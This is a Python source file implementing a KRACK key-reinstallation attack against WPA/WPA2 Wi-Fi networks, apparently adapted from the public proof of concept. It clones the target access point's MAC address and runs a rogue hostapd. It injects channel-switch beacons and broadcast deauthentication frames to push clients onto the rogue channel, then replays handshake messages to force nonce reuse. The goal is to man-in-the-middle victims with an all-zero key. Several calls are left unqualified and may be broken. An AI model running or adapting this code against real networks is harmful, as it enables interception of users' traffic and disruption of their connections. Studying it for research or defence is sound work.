import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time, heapq, subprocess, select
from datetime import datetime
from wpaspy import Ctrl
from mitmSocket import MitmSocket
from networkConfig import NetworkConfig
from .helper import logging
from .helper import packetProcess
from clientState import ClientState

class KRAckAttack():
	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, password, clientmac=None, dumpfile=None, cont_csa=False):
		self.nic_real = nic_real
		self.nic_real_clientack = None
		self.nic_rogue_ap = nic_rogue_ap
		self.nic_rogue_mon = nic_rogue_mon
		self.dumpfile = dumpfile
		self.ssid = ssid
		self.password = password
		self.beacon = None
		self.apmac = None
		self.netconfig = None
		self.hostapd = None
		self.hostapd_log = None

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()

		self.sock_real  = None
		self.sock_rogue = None
		self.clients = dict()
		self.disas_queue = []
		self.continuous_csa = cont_csa
		self.group = logging.group
		# 用來監控介面是否在適當的頻道中
		self.last_real_beacon = None
		self.last_rogue_beacon = None
		# 用來攻擊/測試 group key handshake
		self.group1 = []
		self.time_forward_group1 = None

	def hostapd_rx_mgmt(self, p):
		logging.log(logging.DEBUG, "Sent frame to hostapd: %s" % packetProcess.dot11_to_str(p))
		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

	def hostapd_add_sta(self, macaddr):
		logging.log(logging.DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))

	def hostapd_finish_4way(self, stamac):
		logging.log(logging.DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)

	def find_beacon(self, ssid):
		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and packetProcess.get_tlv_value(p, logging.IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # opened_socket=self.sock_real iface=self.nic_real
		if ps is None or len(ps) < 1:
			logging.log(logging.STATUS, "Searching for target network on other channels")
			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
				self.sock_real.set_channel(chan)
				logging.log(logging.DEBUG, "Listening on channel %d" % chan)
				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and packetProcess.get_tlv_value(p, logging.IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # , opened_socket=self.sock_real
				if ps and len(ps) >= 1: break

		if ps and len(ps) >= 1:
			actual_chan = ord(packetProcess.get_tlv_value(ps[0], logging.IEEE_TLV_TYPE_CHANNEL))
			self.sock_real.set_channel(actual_chan)
			self.beacon = ps[0]
			self.apmac = self.beacon.addr2

	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
		newchannel = self.netconfig.rogue_channel
		beacon = self.beacon.copy()
		if target: beacon.addr1 = target

		for i in range(numbeacons):
			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
			# followed by one with a value of 1. When starting with 1 it errors out.
			csabeacon = packetProcess.append_csa(beacon, newchannel, 2)
			self.sock_real.send(csabeacon)

			csabeacon = packetProcess.append_csa(beacon, newchannel, 1)
			self.sock_real.send(csabeacon)

		if not silent: logging.log(logging.STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")

	def send_disas(self, macaddr):
		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
		self.sock_rogue.send(p)
		logging.log(logging.STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")

	def queue_disas(self, macaddr):
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))

	def try_channel_switch(self, macaddr):
		self.send_csa_beacon()
		self.queue_disas(macaddr)

	def hostapd_add_allzero_client(self, client: ClientState):
		if client.assocreq is None:
			logging.log(logging.ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
			return False

		# 1. Add the client to hostapd
		self.hostapd_add_sta(client.macaddr)

		# 2. Inform hostapd of the encryption algorithm and options the client uses
		self.hostapd_rx_mgmt(client.assocreq)

		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
		self.hostapd_finish_4way(client.macaddr)

		return True

	def handle_to_client_pairwise(self, client: ClientState, p):
		if self.group: return False

		eapolnum = packetProcess.get_eapol_msgnum(p)
		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			logging.log(logging.DEBUG, "Storing msg1")
			client.store_msg1(p)
		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			client.add_if_new_msg3(p)
			# FIXME: This may cause a timeout on the client side???
			if len(client.msg3s) >= 2:
				logging.log(logging.STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
				logging.log(logging.STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)

				# FIXME: Warning if msg1 was not detected. Or generate it ourselves.
				packet_list = client.msg3s
				p = packetProcess.set_eapol_replaynum(client.msg1, packetProcess.get_eapol_replaynum(packet_list[0]) + 1)
				packet_list.insert(1, p)

				for p in packet_list: self.sock_rogue.send(p)
				client.msg3s = []

				# TODO: Should extra stuff be done here? Forward msg4 to real AP?
				client.attack_start()
			else:
				logging.log(logging.STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)

			return True

		return False

	def handle_from_client_pairwise(self, client: ClientState, p):
		if self.group: return

		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
		plaintext = "\xaa\xaa\x03\x00\x00\x00"
		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
		keystream = xorstr(plaintext, encrypted)

		iv = packetProcess.dot11_get_iv(p)
		if iv <= 1: logging.log(logging.DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)

		# FIXME:
		# - The reused IV could be one we accidently missed due to high traffic!!!
		# - It could be a retransmitted packet
		if client.is_iv_reused(iv):
			# If the same keystream is reused, we have a normal key reinstallation attack
			if keystream == client.get_keystream(iv):
				logging.log(logging.STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
				client.update_state(ClientState.Success_Reinstalled)

				# TODO: Confirm that the handshake now indeed completes. FIXME: Only if we have a msg4?
				self.sock_real.send(client.msg4)

			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
			else:
				# TODO: We can explicitly try to decrypt it using an all-zero key
				logging.log(logging.STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
				logging.log(logging.STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)

				self.hostapd_add_allzero_client(client)

				# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
				client.update_state(ClientState.Success_AllzeroKey)

		elif client.attack_timeout(iv):
			logging.log(logging.WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
			client.update_state(ClientState.Failed)

		client.save_iv_keystream(iv, keystream)

	def handle_to_client_groupkey(self, client: ClientState, p):
		if not self.group: return False

		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
		if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and packetProcess.dot11_get_tid(p) == 7:
			# TODO: Detect that it's not a retransmission
			self.group1.append(p)
			logging.log(logging.STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
			if len(self.group1) == 2:
				logging.log(logging.STATUS, "Forwarding first group1 message", showtime=False)
				self.sock_rogue.send(self.group1.pop(0))

				self.time_forward_group1 = time.time() + 3

			return True
		return False

	def handle_from_client_groupkey(self, client, p):
		if not self.group: return
	
		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and packetProcess.dot11_get_tid(p) == 7:
			logging.log(logging.STATUS, "Got a likely group message 2", showtime=False)

	def handle_rx_realchan(self):
		p = self.sock_real.recv()
		if p == None: return

		# 1. Handle frames sent TO the real AP
		if p.addr1 == self.apmac:
			# If it's an authentication to the real AP, always display it ...
			if p.haslayer(Dot11Auth):
				packetProcess.print_rx(logging.INFO, "Real channel ", p, color="orange")

				# ... with an extra clear warning when we wanted to MitM this specific client
				if self.clientmac == p.addr2:
					logging.log(logging.WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

				if p.addr2 in self.clients: del self.clients[p.addr2]
				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
				self.send_csa_beacon(target=p.addr2)
				self.send_csa_beacon()
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].update_state(ClientState.Connecting)

			# Remember association request to save connection parameters
			elif p.haslayer(Dot11AssoReq):
				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p

			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
				packetProcess.print_rx(logging.INFO, "Real channel ", p)
				if p.addr2 in self.clients: del self.clients[p.addr2]

			# Display all frames sent from a MitM'ed client
			elif p.addr2 in self.clients:
				packetProcess.print_rx(logging.INFO, "Real channel ", p)

			# For all other frames, only display them if they come from the targeted client
			elif self.clientmac is not None and self.clientmac == p.addr2:
				packetProcess.print_rx(logging.INFO, "Real channel ", p)


			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
				logging.log(logging.WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))

		# 2. Handle frames sent BY the real AP
		elif p.addr2 == self.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
			if p.haslayer(Dot11Beacon) and ord(packetProcess.get_tlv_value(p, logging.IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
				self.last_real_beacon = time.time()

			# Decide whether we will (eventually) forward it
			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
			might_forward = might_forward or (self.group and packetProcess.dot11_is_group(p) and p.haslayer(Dot11WEP))

			# Pay special attention to Deauth and Disassoc frames
			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
				packetProcess.print_rx(logging.INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			# If targeting a specific client, display all frames it sends
			elif self.clientmac is not None and self.clientmac == p.addr1:
				packetProcess.print_rx(logging.INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			# For other clients, just display what might be forwarded
			elif might_forward:
				packetProcess.print_rx(logging.INFO, "Real channel ", p, suffix=" -- MitM'ing")

			# Now perform actual actions that need to be taken, along with additional output
			if might_forward:
				# Unicast frames to clients
				if p.addr1 in self.clients:
					client = self.clients[p.addr1]

					# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
					if self.handle_to_client_pairwise(client, p):
						pass

					elif self.handle_to_client_groupkey(client, p):
						pass

					elif p.haslayer(Dot11Deauth):
						del self.clients[p.addr1]
						self.sock_rogue.send(p)

					else:
						self.sock_rogue.send(p)

				# Group addressed frames
				else:
					self.sock_rogue.send(p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			packetProcess.print_rx(logging.INFO, "Real channel ", p)

	def handle_rx_roguechan(self):
		p = self.sock_rogue.recv()
		if p == None: return

		# 1. Handle frames sent BY the rouge AP
		if p.addr2 == self.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
			if p.haslayer(Dot11Beacon) and ord(packetProcess.get_tlv_value(p, logging.IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
				self.last_rogue_beacon = time.time()
			# Display all frames sent to the targeted client
			if self.clientmac is not None and p.addr1 == self.clientmac:
				packetProcess.print_rx(logging.INFO, "Rogue channel", p)
			# And display all frames sent to a MitM'ed client
			elif p.addr1 in self.clients:
				packetProcess.print_rx(logging.INFO, "Rogue channel", p)

		# 2. Handle frames sent TO the AP
		elif p.addr1 == self.apmac:
			client = None

			# Check if it's a new client that we can MitM
			if p.haslayer(Dot11Auth):
				packetProcess.print_rx(logging.INFO, "Rogue channel", p, suffix=" -- MitM'ing")
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].mark_got_mitm()
				client = self.clients[p.addr2]
				will_forward = True
			# Otherwise check of it's an existing client we are tracking/MitM'ing
			elif p.addr2 in self.clients:
				client = self.clients[p.addr2]
				will_forward = client.should_forward(p)
				packetProcess.print_rx(logging.INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
			# Always display all frames sent by the targeted client
			elif p.addr2 == self.clientmac:
				packetProcess.print_rx(logging.INFO, "Rogue channel", p)

			# If this now belongs to a client we want to track, process the packet further
			if client is not None:
				# Save the association request so we can track the encryption algorithm and options the client uses
				if p.haslayer(Dot11AssoReq): client.assocreq = p
				# Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
				if get_eapol_msgnum(p) == 4: client.msg4 = p

				# Client is sending on rogue channel, we got a MitM position =)
				client.mark_got_mitm()

				if p.haslayer(Dot11WEP):
					# Use encrypted frames to determine if the key reinstallation attack succeeded
					# 檢查 KRACK攻擊有沒有成功，
					self.handle_from_client_pairwise(client, p)
					self.handle_from_client_groupkey(client, p)

				if will_forward:
					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
					if client.state < ClientState.Attack_Started:
						p.FCfield &= 0xFFEF

					self.sock_real.send(p)


		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Rogue channel", p)

	def handle_hostapd_out(self):
		# hostapd always prints lines so this should not block
		line = self.hostapd.stdout.readline()
		if line == "":
			logging.log(logging.ERROR, "Rogue hostapd instances unexpectedly closed")
			quit(1)

		if line.startswith(">>>> ".encode()):
			logging.log(logging.STATUS, "Rogue hostapd: " + line[5:].strip().decode())
		elif line.startswith(">>> ".encode()):
			logging.log(logging.DEBUG, "Rogue hostapd: " + line[4:].strip().decode())
		# This is a bit hacky but very usefull for quick debugging
		elif "fc=0xc0".encode() in line:
			logging.log(logging.WARNING, "Rogue hostapd: " + line.strip().decode())
		elif "sta_remove".encode() in line or "Add STA".encode() in line or "disassoc cb".encode() in line or "disassocation: STA".encode() in line:
			logging.log(logging.DEBUG, "Rogue hostapd: " + line.strip().decode())
		else:
			logging.log(logging.ALL, "Rogue hostapd: " + line.strip().decode())

		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())

	def configure_interfaces(self):
		# 0. Warn about common mistakes
		logging.log(logging.STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
		logging.log(logging.STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")

		# 1. Remove unused virtual interfaces
		subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		if self.nic_rogue_mon is None:
			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["ifconfig", self.nic_real, "down"])
		subprocess.check_output(["iwconfig", self.nic_real, "mode", "monitor"])
		if self.nic_rogue_mon is None:
			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
			# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
			# sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
			time.sleep(0.2)

		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])

		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
		if self.clientmac:
				self.nic_real_clientack = self.nic_real + "sta1"
				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
				packetProcess.call_macchanger(self.nic_real_clientack, self.clientmac)
		else:
			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
			logging.log(logging.WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
			# Sleep for a second to make this warning very explicit
			time.sleep(1)

		# 4. Finally put the interfaces up
		subprocess.check_output(["ifconfig", self.nic_real, "up"])
		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
	
	# 主要執行 func.
	def run(self, strict_echo_test=False):
		self.configure_interfaces()

		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
		self.find_beacon(self.ssid)
		if self.beacon is None:
			logging.log(logging.ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
			return
		# 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
		self.netconfig = NetworkConfig(self.password)
		self.netconfig.from_beacon(self.beacon)
		if not self.netconfig.is_wparsn():
			logging.log(logging.ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
			return
		elif self.netconfig.real_channel > 13:
			logging.log(logging.WARNING, "Attack not yet tested against 5 GHz networks.")
		self.netconfig.find_rogue_channel()

		logging.log(logging.STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
		logging.log(logging.STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
		# 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
		logging.log(logging.STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		packetProcess.set_mac_address(self.nic_rogue_ap, self.apmac)

		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])

		# FIXME: Set BFP filters to increase performance, can't set suceessful.
		# bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
		# if self.clientmac:
		# 	bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
		# bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
		# self.sock_real.attach_filter(bpf)
		# self.sock_rogue.attach_filter(bpf)

		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
			fp.write(self.netconfig.write_config(self.nic_rogue_ap))

		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		self.hostapd_log = open("hostapd_rogue.log", "w")

		logging.log(logging.STATUS, "Giving the rogue hostapd one second to initialize ...")
		time.sleep(10)

		# when domain name (encode) to idna, label empty or too long error, 
		# that is because domain name uses "." to split label,
		# every label limited to longest 63 characters or no empty.
		self.hostapd_ctrl = Ctrl("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
		self.hostapd_ctrl.attach()

		# Inject some CSA beacons to push victims to our channel
		self.send_csa_beacon(numbeacons=4)

		# deauthenticated 所有 client端，讓 AP 端重新四次交握
		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
		self.sock_real.send(deauth)

		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
		if self.clientmac:
			self.queue_disas(self.clientmac)

		# 將流氓 AP 與原 AP 連線
		# subprocess.check_output(["wpa_supplicant", "-i", "wlan0sta1", "-c", "/home/sun10/krackattacks-poc-zerokey/wpa_supplicant/rea_ap.conf", "-B"])

		# Continue attack by monitoring both channels and performing needed actions
		self.last_real_beacon = time.time()
		self.last_rogue_beacon = time.time()
		nextbeacon = time.time() + 0.01
		while True:
			sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
			if self.sock_real      in sel[0]: self.handle_rx_realchan()
			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()

			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
				p = self.group1.pop(0)
				self.sock_rogue.send(p)
				self.time_forward_group1 = None
				logging.log(logging.STATUS, "Injected older group message 1: %s" % packetProcess.dot11_to_str(p), color="green")

			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])

			if self.continuous_csa and nextbeacon <= time.time():
				self.send_csa_beacon(silent=True)
				nextbeacon += 0.10

			if self.last_real_beacon + 2 < time.time():
				logging.log(logging.WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
				self.last_real_beacon = time.time()
			if self.last_rogue_beacon + 2 < time.time():
				logging.log(logging.WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
				self.last_rogue_beacon = time.time()


	def stop(self):
		logging.log(logging.STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()
		if self.hostapd_log:
			self.hostapd_log.close()
		if self.sock_real: self.sock_real.close()
		if self.sock_rogue: self.sock_rogue.close()

